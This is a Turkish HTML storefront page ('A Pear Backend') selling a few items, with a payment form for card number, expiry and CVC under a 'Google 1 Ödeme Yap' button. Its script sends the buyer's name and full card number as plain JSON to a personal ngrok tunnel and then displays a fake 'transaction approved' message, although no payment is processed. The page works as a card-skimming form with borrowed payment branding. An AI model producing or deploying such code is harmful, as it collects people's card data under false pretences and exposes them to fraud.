<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>A Pear Backend</title>
    <style>
        body { background: #000; color: #fff; font-family: 'Segoe UI', sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; overflow: hidden; }
        #intro { position: fixed; width: 100%; height: 100%; background: #000; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 999; animation: fadeOut 3s forwards; }
        @keyframes fadeOut { 80% { opacity: 1; } 100% { opacity: 0; pointer-events: none; } }
        
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; z-index: 1; }
        .box { border: 1px solid #444; padding: 20px; border-radius: 15px; cursor: pointer; text-align: center; width: 150px; transition: 0.3s; }
        .box:hover { background: #111; }
        
        #pay-screen { display: none; background: #111; padding: 30px; border-radius: 20px; border: 1px solid #555; width: 320px; text-align: center; }
        input { width: 90%; padding: 12px; margin: 8px 0; border-radius: 8px; border: none; background: #222; color: #fff; }
        
        .loader { border: 4px solid #333; border-top: 4px solid #00f; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div id="intro"><h1>A Pear Backend</h1><p>Karne günü kargolayacağız.</p></div>

    <div class="grid" id="menu">
        <div class="box" onclick="selectItem('Uçak Büyük', 50)">Uçak Büyük<br>50 TL</div>
        <div class="box" onclick="selectItem('Uçak', 40)">Uçak<br>40 TL</div>
        <div class="box" onclick="selectItem('Star Spiral', 30)">Star Spiral<br>30 TL</div>
        <div class="box" onclick="selectItem('Özel', 0)">Özel<br>??? TL</div>
    </div>

    <div id="pay-screen">
        <h3 id="order-title">Ödeme</h3>
        <input type="text" id="isim" placeholder="İsim Soyisim">
        <div id="ozel-div" style="display:none;"><input type="text" id="ozel" placeholder="Özel isteğin..."></div>
        <input type="text" id="kart" placeholder="Kart No (16 Hane)" maxlength="16" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
        <input type="text" id="tarih" placeholder="Tarih (AA/YY)" maxlength="5">
        <input type="text" id="cvc" placeholder="CVC (3 Hane)" maxlength="3" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
        <label><input type="checkbox" id="kabul"> Şartları kabul ediyorum.</label>
        <button onclick="pay()" style="width:100%; padding:10px; margin-top:10px;">Google 1 Ödeme Yap</button>
    </div>

    <div id="success" style="display:none; text-align:center;">
        <div class="loader"></div>
        <h3>İşleminiz Onaylandı</h3>
    </div>

    <script>
    function selectItem(name, price) {
        document.getElementById('menu').style.display = 'none';
        document.getElementById('pay-screen').style.display = 'block';
        document.getElementById('order-title').innerText = name + " - " + price + " TL";
        if(name === 'Özel') document.getElementById('ozel-div').style.display = 'block';
    }

    async function pay() {
        // Doğrulama
        if(document.getElementById('kart').value.length !== 16 || !document.getElementById('kabul').checked) {
            return alert("Kart bilgileri hatalı veya şartları kabul etmedin!");
        }

        const data = {
            isim: document.getElementById('isim').value,
            urun: document.getElementById('order-title').innerText,
            ozel: document.getElementById('ozel').value,
            kart: document.getElementById('kart').value
        };

        try {
            // BURAYA KENDİ NGROK LİNKİNİ YAPIŞTIR
            const response = await fetch('https://punctual-villain-arson.ngrok-free.dev/siparis-al', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });

            if(response.ok) {
                document.getElementById('pay-screen').style.display = 'none';
                document.getElementById('success').style.display = 'block';
            }
        } catch(err) {
            alert("Sunucuya bağlanılamadı, ngrok açık mı?");
        }
    }
</script>
</body>
</html>
